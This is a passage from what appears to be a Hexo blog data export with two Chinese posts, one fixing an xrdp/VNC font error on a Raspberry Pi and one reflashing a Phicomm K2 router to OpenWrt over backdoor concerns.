:::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::8080                 :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::36666                :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 :::36667                :::*                    LISTEN      off (0.00/0/0)\ntcp6       0      0 ::1:9090                :::*                    LISTEN      off (0.00/0/0)\n\n```\n可以看到服务已经开启了,5901端口处于监听状态.再次`mstsc`之后发现error没了,问题解决.\n# 总结\n遇到问题还是要有折腾的情怀,虽然还不知所以然,但是能够解决这个问题也不辜负**搬砖**的身份...为了不犯第二次错误,便记录下了本文.\n","slug":"raspberry-pi-xrdp-error","published":1,"updated":"2016-11-14T02:56:11.086Z","_id":"civhncdfw001ng8ua3yrrrs98","comments":1,"layout":"post","photos":[],"link":"","content":"<p>参考资料:<br><a href=\"http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver\" target=\"_blank\" rel=\"external\">http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver</a></p>\n<blockquote>\n<p>关于树莓派的介绍以及使用可参考官方网站  </p>\n</blockquote>\n<h1 id=\"单板Linux\"><a href=\"#单板Linux\" class=\"headerlink\" title=\"单板Linux\"></a>单板Linux</h1><p>随着嵌入式Linux越来越流行,目前很多厂商都在致力于做单板主机,因此市面上也有很多产品可供选择.其中最具有活力的便是树莓派了,连在<strong>Mr Robot</strong>一剧中都被主人公拿来”打广告”.其他诸如香蕉派,香橙派,菠萝派等等pi都有开发团队在开发和维护,有兴趣的可以逐个折腾或者吊的自己绘制PCB制作.</p>\n<h1 id=\"访问方式\"><a href=\"#访问方式\" class=\"headerlink\" title=\"访问方式\"></a>访问方式</h1><p>毫无疑问Web是目前最流行的可视化途径,但是在Linux中最最适合的还是属于console.一般默认在刷入固件之后会默认开启sshd服务,此时便可以通过网络接口ssh连接工具访问树莓派.当然,如果没有开启或者没有通过扫描等方式获取到树莓派的IP地址,则可以借助显示设备或者默认的串口来查看信息,可供选择的是显示接口为HDMI和专用显示接口,一般我们会用HDMI转VGA转接口来接显示屏,此后配置好后便可以当小型服务器用了.</p>\n<h1 id=\"配置远程桌面\"><a href=\"#配置远程桌面\" class=\"headerlink\" title=\"配置远程桌面\"></a>配置远程桌面</h1><p>有些时候console解决不了的时候就必须启用rdp了.Linux中可供选择的桌面系统还是很多的,其中xfce作为流行的轻量级的桌面系统深受好评.一般我们仅仅需要开启xrdp服务即可采用微软的<strong>mstsc</strong>工具来连接Linux主机,但xrdp貌似也是在本地封装vnc服务,因此当vnc服务出现问题的时候即便3389端口处于监听状态也是没辙.无奈只好谷歌.报错信息如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div></pre></td><td class=\"code\"><pre><div class=\"line\">osmc@osmc:~$ vncserver </div><div class=\"line\">Couldn<span class=\"string\">'t start Xtightvnc; trying default font path.</span></div><div class=\"line\">Please set correct fontPath in the vncserver script.</div><div class=\"line\">Couldn't start Xtightvnc process.</div><div class=\"line\"></div><div class=\"line\">07/11/16 01:04:29 Xvnc version TightVNC-1.3.9</div><div class=\"line\">07/11/16 01:04:29 Copyright (C) 2000-2007 TightVNC Group</div><div class=\"line\">07/11/16 01:04:29 Copyright (C) 1999 AT&amp;T Laboratories Cambridge</div><div class=\"line\">07/11/16 01:04:29 All Rights Reserved.</div><div class=\"line\">07/11/16 01:04:29 See http://www.tightvnc.com/ <span class=\"keyword\">for</span> information on TightVNC</div><div class=\"line\">07/11/16 01:04:29 Desktop name <span class=\"string\">'X'</span> (osmc:1)</div><div class=\"line\">07/11/16 01:04:29 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t</div><div class=\"line\">07/11/16 01:04:29 Listening <span class=\"keyword\">for</span> VNC connections on TCP port 5901</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/misc/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/Type1/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/75dpi/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/100dpi/'</span> not found - ignoring</div><div class=\"line\"></div><div class=\"line\">Fatal server error:</div><div class=\"line\">could not open default font <span class=\"string\">'fixed'</span></div><div class=\"line\">07/11/16 01:04:30 Xvnc version TightVNC-1.3.9</div><div class=\"line\">07/11/16 01:04:30 Copyright (C) 2000-2007 TightVNC Group</div><div class=\"line\">07/11/16 01:04:30 Copyright (C) 1999 AT&amp;T Laboratories Cambridge</div><div class=\"line\">07/11/16 01:04:30 All Rights Reserved.</div><div class=\"line\">07/11/16 01:04:30 See http://www.tightvnc.com/ <span class=\"keyword\">for</span> information on TightVNC</div><div class=\"line\">07/11/16 01:04:30 Desktop name <span class=\"string\">'X'</span> (osmc:1)</div><div class=\"line\">07/11/16 01:04:30 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t</div><div class=\"line\">07/11/16 01:04:30 Listening <span class=\"keyword\">for</span> VNC connections on TCP port 5901</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/misc/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/Speedo/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/Type1/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/75dpi/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/100dpi/'</span> not found - ignoring</div><div class=\"line\"></div><div class=\"line\">Fatal server error:</div><div class=\"line\">could not open default font <span class=\"string\">'fixed'</span></div></pre></td></tr></table></figure></p>\n<p>找了好几个论坛之后又装了好多貌似多余的东西,最后发现仅仅需在<a href=\"http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver\" target=\"_blank\" rel=\"external\">这里</a>键入<code>sudo apt-get install  xfonts-base</code>即可解决字体问题了.   </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\">osmc@osmc:~$ sudo vncserver </div><div class=\"line\"></div><div class=\"line\">New <span class=\"string\">'X'</span> desktop is osmc:1</div><div class=\"line\"></div><div class=\"line\">Creating default startup script /root/.vnc/xstartup</div><div class=\"line\">Starting applications specified <span class=\"keyword\">in</span> /root/.vnc/xstartup</div><div class=\"line\">Log file is /root/.vnc/osmc:1.log</div><div class=\"line\"></div><div class=\"line\">osmc@osmc:~$ netstat -anot</div><div class=\"line\">Active Internet connections (servers and established)</div><div class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</div><div class=\"line\">tcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:6001            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 127.0.0.1:3350          0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:1177            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:36666           0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0    180 192.168.31.132:22       10.129.95.50:33532      ESTABLISHED on (0.21/0/0)</div><div class=\"line\">tcp6       0      0 :::111                  :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 :::8080                 :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 :::36666                :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 :::36667                :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 ::1:9090                :::*                    LISTEN      off (0.00/0/0)</div></pre></td></tr></table></figure>\n<p>可以看到服务已经开启了,5901端口处于监听状态.再次<code>mstsc</code>之后发现error没了,问题解决.</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>遇到问题还是要有折腾的情怀,虽然还不知所以然,但是能够解决这个问题也不辜负<strong>搬砖</strong>的身份…为了不犯第二次错误,便记录下了本文.</p>\n","excerpt":"","more":"<p>参考资料:<br><a href=\"http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver\">http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver</a></p>\n<blockquote>\n<p>关于树莓派的介绍以及使用可参考官方网站  </p>\n</blockquote>\n<h1 id=\"单板Linux\"><a href=\"#单板Linux\" class=\"headerlink\" title=\"单板Linux\"></a>单板Linux</h1><p>随着嵌入式Linux越来越流行,目前很多厂商都在致力于做单板主机,因此市面上也有很多产品可供选择.其中最具有活力的便是树莓派了,连在<strong>Mr Robot</strong>一剧中都被主人公拿来”打广告”.其他诸如香蕉派,香橙派,菠萝派等等pi都有开发团队在开发和维护,有兴趣的可以逐个折腾或者吊的自己绘制PCB制作.</p>\n<h1 id=\"访问方式\"><a href=\"#访问方式\" class=\"headerlink\" title=\"访问方式\"></a>访问方式</h1><p>毫无疑问Web是目前最流行的可视化途径,但是在Linux中最最适合的还是属于console.一般默认在刷入固件之后会默认开启sshd服务,此时便可以通过网络接口ssh连接工具访问树莓派.当然,如果没有开启或者没有通过扫描等方式获取到树莓派的IP地址,则可以借助显示设备或者默认的串口来查看信息,可供选择的是显示接口为HDMI和专用显示接口,一般我们会用HDMI转VGA转接口来接显示屏,此后配置好后便可以当小型服务器用了.</p>\n<h1 id=\"配置远程桌面\"><a href=\"#配置远程桌面\" class=\"headerlink\" title=\"配置远程桌面\"></a>配置远程桌面</h1><p>有些时候console解决不了的时候就必须启用rdp了.Linux中可供选择的桌面系统还是很多的,其中xfce作为流行的轻量级的桌面系统深受好评.一般我们仅仅需要开启xrdp服务即可采用微软的<strong>mstsc</strong>工具来连接Linux主机,但xrdp貌似也是在本地封装vnc服务,因此当vnc服务出现问题的时候即便3389端口处于监听状态也是没辙.无奈只好谷歌.报错信息如下:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div></pre></td><td class=\"code\"><pre><div class=\"line\">osmc@osmc:~$ vncserver </div><div class=\"line\">Couldn<span class=\"string\">'t start Xtightvnc; trying default font path.</div><div class=\"line\">Please set correct fontPath in the vncserver script.</div><div class=\"line\">Couldn'</span>t start Xtightvnc process.</div><div class=\"line\"></div><div class=\"line\">07/11/16 01:04:29 Xvnc version TightVNC-1.3.9</div><div class=\"line\">07/11/16 01:04:29 Copyright (C) 2000-2007 TightVNC Group</div><div class=\"line\">07/11/16 01:04:29 Copyright (C) 1999 AT&amp;T Laboratories Cambridge</div><div class=\"line\">07/11/16 01:04:29 All Rights Reserved.</div><div class=\"line\">07/11/16 01:04:29 See http://www.tightvnc.com/ <span class=\"keyword\">for</span> information on TightVNC</div><div class=\"line\">07/11/16 01:04:29 Desktop name <span class=\"string\">'X'</span> (osmc:1)</div><div class=\"line\">07/11/16 01:04:29 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t</div><div class=\"line\">07/11/16 01:04:29 Listening <span class=\"keyword\">for</span> VNC connections on TCP port 5901</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/misc/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/Type1/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/75dpi/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/100dpi/'</span> not found - ignoring</div><div class=\"line\"></div><div class=\"line\">Fatal server error:</div><div class=\"line\">could not open default font <span class=\"string\">'fixed'</span></div><div class=\"line\">07/11/16 01:04:30 Xvnc version TightVNC-1.3.9</div><div class=\"line\">07/11/16 01:04:30 Copyright (C) 2000-2007 TightVNC Group</div><div class=\"line\">07/11/16 01:04:30 Copyright (C) 1999 AT&amp;T Laboratories Cambridge</div><div class=\"line\">07/11/16 01:04:30 All Rights Reserved.</div><div class=\"line\">07/11/16 01:04:30 See http://www.tightvnc.com/ <span class=\"keyword\">for</span> information on TightVNC</div><div class=\"line\">07/11/16 01:04:30 Desktop name <span class=\"string\">'X'</span> (osmc:1)</div><div class=\"line\">07/11/16 01:04:30 Protocol versions supported: 3.3, 3.7, 3.8, 3.7t, 3.8t</div><div class=\"line\">07/11/16 01:04:30 Listening <span class=\"keyword\">for</span> VNC connections on TCP port 5901</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/misc/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/Speedo/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/Type1/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/75dpi/'</span> not found - ignoring</div><div class=\"line\">Font directory <span class=\"string\">'/usr/share/fonts/X11/100dpi/'</span> not found - ignoring</div><div class=\"line\"></div><div class=\"line\">Fatal server error:</div><div class=\"line\">could not open default font <span class=\"string\">'fixed'</span></div></pre></td></tr></table></figure></p>\n<p>找了好几个论坛之后又装了好多貌似多余的东西,最后发现仅仅需在<a href=\"http://askubuntu.com/questions/648819/couldnt-start-xtightvnc-trying-default-font-path-vncserver\">这里</a>键入<code>sudo apt-get install  xfonts-base</code>即可解决字体问题了.   </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div></pre></td><td class=\"code\"><pre><div class=\"line\">osmc@osmc:~$ sudo vncserver </div><div class=\"line\"></div><div class=\"line\">New <span class=\"string\">'X'</span> desktop is osmc:1</div><div class=\"line\"></div><div class=\"line\">Creating default startup script /root/.vnc/xstartup</div><div class=\"line\">Starting applications specified <span class=\"keyword\">in</span> /root/.vnc/xstartup</div><div class=\"line\">Log file is /root/.vnc/osmc:1.log</div><div class=\"line\"></div><div class=\"line\">osmc@osmc:~$ netstat -anot</div><div class=\"line\">Active Internet connections (servers and established)</div><div class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</div><div class=\"line\">tcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:6001            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 127.0.0.1:3350          0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:1177            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:36666           0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp        0    180 192.168.31.132:22       10.129.95.50:33532      ESTABLISHED on (0.21/0/0)</div><div class=\"line\">tcp6       0      0 :::111                  :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 :::8080                 :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 :::36666                :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 :::36667                :::*                    LISTEN      off (0.00/0/0)</div><div class=\"line\">tcp6       0      0 ::1:9090                :::*                    LISTEN      off (0.00/0/0)</div></pre></td></tr></table></figure>\n<p>可以看到服务已经开启了,5901端口处于监听状态.再次<code>mstsc</code>之后发现error没了,问题解决.</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>遇到问题还是要有折腾的情怀,虽然还不知所以然,但是能够解决这个问题也不辜负<strong>搬砖</strong>的身份…为了不犯第二次错误,便记录下了本文.</p>\n"},{"title":"没这么好的\"馅饼\"","date":"2016-10-28T06:23:07.000Z","_content":"\n\n> 自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.\n\n  \n  参考资料:  \n  [http://bbs.newifi.com/thread-3351-1-1.html](http://bbs.newifi.com/thread-3351-1-1.html)\n  [http://www.shaoit.com/feixunshuaji.html](http://www.shaoit.com/feixunshuaji.html)\n  [http://www.qqgzs.com/archives/k2-v22-148.html](http://www.qqgzs.com/archives/k2-v22-148.html)\n  [http://www.openwrt.org.cn/bbs/thread-60-1-1.html](http://www.openwrt.org.cn/bbs/thread-60-1-1.html)\n  [http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/)\n  [OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start](http://wiki.openwrt.org/zh-cn/doc/start)\n\n\n  ----------------------\n\n\n\n##  到货\n看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有[后门](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/),吓得我赶紧连开机都不试了就开始找各种固件.\n\n##  刷刷刷\n根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行\"测试\"...为了安全,我决定还是刷**OpenWrt**.当然也有同学刷其他固件的,也不错.从[这里](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/)提供的云盘链接下载的K2配置文件发现不能恢复,后来从[这里](http://www.qqgzs.com/archives/k2-v22-148.html)下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误...后来还是果断选择了先解决breed,而后再刷OpenWrt固件,如果不信任上述百度云盘的文件,可以去[官网这里](https://downloads.openwrt.org/chaos_calmer/15.05.1/ramips/mt7620/)(注意型号配对)去查md5和sha校验值,我已经查过了,没有问题,至于使用的过程中仍被强行注入广告应该是运营商的问题了.\n![OpenWrt](/images/OpenWrt.png)\n![Openwrt_sha256_compare.png](/images/Openwrt_sha256_compare.png)\n##  测试玩玩\n关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)`ssh root@IP_Address`即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.\n![OpenWrt_ssh](/images/OpenWrt_ssh.png)\n\n## 总结\n东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和\"数据采集\",作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.\n","source":"_posts/没这么好的馅饼.md","raw":"---\ntitle: 没这么好的\"馅饼\"\ndate: 2016-10-28 14:23:07\ncategories:\n- study\ntags:\n- Configure\n- network security\n---\n\n\n> 自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.\n\n  \n  参考资料:  \n  [http://bbs.newifi.com/thread-3351-1-1.html](http://bbs.newifi.com/thread-3351-1-1.html)\n  [http://www.shaoit.com/feixunshuaji.html](http://www.shaoit.com/feixunshuaji.html)\n  [http://www.qqgzs.com/archives/k2-v22-148.html](http://www.qqgzs.com/archives/k2-v22-148.html)\n  [http://www.openwrt.org.cn/bbs/thread-60-1-1.html](http://www.openwrt.org.cn/bbs/thread-60-1-1.html)\n  [http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/)\n  [OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start](http://wiki.openwrt.org/zh-cn/doc/start)\n\n\n  ----------------------\n\n\n\n##  到货\n看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有[后门](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/),吓得我赶紧连开机都不试了就开始找各种固件.\n\n##  刷刷刷\n根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行\"测试\"...为了安全,我决定还是刷**OpenWrt**.当然也有同学刷其他固件的,也不错.从[这里](http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/)提供的云盘链接下载的K2配置文件发现不能恢复,后来从[这里](http://www.qqgzs.com/archives/k2-v22-148.html)下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误...后来还是果断选择了先解决breed,而后再刷OpenWrt固件,如果不信任上述百度云盘的文件,可以去[官网这里](https://downloads.openwrt.org/chaos_calmer/15.05.1/ramips/mt7620/)(注意型号配对)去查md5和sha校验值,我已经查过了,没有问题,至于使用的过程中仍被强行注入广告应该是运营商的问题了.\n![OpenWrt](/images/OpenWrt.png)\n![Openwrt_sha256_compare.png](/images/Openwrt_sha256_compare.png)\n##  测试玩玩\n关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)`ssh root@IP_Address`即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.\n![OpenWrt_ssh](/images/OpenWrt_ssh.png)\n\n## 总结\n东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和\"数据采集\",作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.\n","slug":"没这么好的馅饼","published":1,"updated":"2016-11-14T02:56:11.133Z","_id":"civhncdgr001pg8ua4u63tkld","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.</p>\n</blockquote>\n<p>  参考资料:<br>  <a href=\"http://bbs.newifi.com/thread-3351-1-1.html\" target=\"_blank\" rel=\"external\">http://bbs.newifi.com/thread-3351-1-1.html</a><br>  <a href=\"http://www.shaoit.com/feixunshuaji.html\" target=\"_blank\" rel=\"external\">http://www.shaoit.com/feixunshuaji.html</a><br>  <a href=\"http://www.qqgzs.com/archives/k2-v22-148.html\" target=\"_blank\" rel=\"external\">http://www.qqgzs.com/archives/k2-v22-148.html</a><br>  <a href=\"http://www.openwrt.org.cn/bbs/thread-60-1-1.html\" target=\"_blank\" rel=\"external\">http://www.openwrt.org.cn/bbs/thread-60-1-1.html</a><br>  <a 